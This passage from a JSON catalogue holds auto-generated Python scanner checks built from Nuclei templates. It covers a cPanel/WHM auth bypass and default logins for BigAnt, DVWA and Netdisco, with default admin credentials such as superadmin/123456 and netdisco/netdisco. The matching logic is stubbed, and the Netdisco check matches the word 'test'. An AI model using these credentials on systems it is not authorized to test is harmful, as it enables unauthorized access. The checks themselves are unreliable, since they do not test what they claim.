{result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_41940(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2026",
          "cpanel",
          "whm",
          "auth-bypass",
          "crlf",
          "vkev",
          "kev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_bigant_default_login",
        "name": "BigAnt - Default Password",
        "language": "Python",
        "famille": "Auth",
        "description": "Misconfiguratoin leads to Default Login into BigAnt Super Admin Account.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Login Successfully! Loading...' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "superadmin"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "123456"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: bigant-default-login\nName: BigAnt - Default Password\nSeverity: critical\nDescription: Misconfiguratoin leads to Default Login into BigAnt Super Admin Account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_bigant_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"bigant-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"BigAnt - Default Password\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Login Successfully! Loading...' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Login Successfully! Loading...']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"BigAnt - Default Password\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_bigant_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: bigant-default-login\nName: BigAnt - Default Password\nSeverity: critical\nDescription: Misconfiguratoin leads to Default Login into BigAnt Super Admin Account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_bigant_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"bigant-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"BigAnt - Default Password\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Login Successfully! Loading...' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Login Successfully! Loading...']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"BigAnt - Default Password\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_bigant_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "default-login",
          "bigant",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_dvwa_default_login",
        "name": "DVWA Default Login",
        "language": "Python",
        "famille": "Auth",
        "description": "Damn Vulnerable Web App (DVWA) is a test application for security professionals. The hard coded credentials are part of a security testing scenario.",
        "severity": "critical",
        "detection": "[OR] mot(s) 'You have logged in as 'admin''",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dvwa-default-login\nName: DVWA Default Login\nSeverity: critical\nDescription: Damn Vulnerable Web App (DVWA) is a test application for security professionals. The hard coded credentials are part of a security testing scenario.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dvwa_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dvwa-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"DVWA Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'You have logged in as 'admin''\"\n\n        # Simple word matcher simulation\n        matchers = ['You have logged in as ']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"DVWA Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dvwa_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dvwa-default-login\nName: DVWA Default Login\nSeverity: critical\nDescription: Damn Vulnerable Web App (DVWA) is a test application for security professionals. The hard coded credentials are part of a security testing scenario.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dvwa_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dvwa-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"DVWA Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'You have logged in as 'admin''\"\n\n        # Simple word matcher simulation\n        matchers = ['You have logged in as ']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"DVWA Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dvwa_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "dvwa",
          "default-login",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_netdisco_default_login",
        "name": "Netdisco Admin - Default Login",
        "language": "Python",
        "famille": "Auth",
        "description": "Detects use of hard-coded credentials in Netdisco.",
        "severity": "critical",
        "detection": "[OR] DSL: contains_all(body, \"User Management\", \"/admin/discoverall\", \"Logged in as\"); status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "netdisco"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "netdisco"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: netdisco-default-login\nName: Netdisco Admin - Default Login\nSeverity: critical\nDescription: Detects use of hard-coded credentials in Netdisco.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_netdisco_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"netdisco-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"Netdisco Admin - Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body, \"User Management\", \"/admin/discoverall\", \"Logged in as\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Netdisco Admin - Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_netdisco_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
